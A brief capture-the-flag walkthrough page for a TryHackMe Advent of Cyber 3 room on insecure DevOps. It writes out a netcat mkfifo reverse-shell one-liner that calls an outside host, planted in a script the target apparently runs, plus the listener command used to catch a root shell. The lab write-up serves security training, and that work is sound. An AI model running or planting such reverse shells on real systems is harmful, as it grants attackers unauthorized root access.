---
title: Day 14
layout: page
permalink: /CTF/adventofcyber3/day14
tags: TryHackMe
---

# Day-14:Dev(Insecure)Ops
# ![front](/images/aoc3/d14/front.png)
[https://tryhackme.com/room/adventofcyber3](https://tryhackme.com/room/adventofcyber3)


## Gaining Access
1. Using dirb command to find <br>
➟ 4 Directories
2. Number of scripts<br>
![scripts](/images/aoc3/d14/script.png)
3. Inside loot.sh add netcat reverse shell one liner `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` then start a listner at attacker's machine `nc -lvnp 1234` wait for a minute and you will have the root access
* cat /etc/passwd<br>
![pepper](/images/aoc3/d14/pepper.png) 
4. Flag:<br>
![flag](/images/aoc3/d14/flag.png)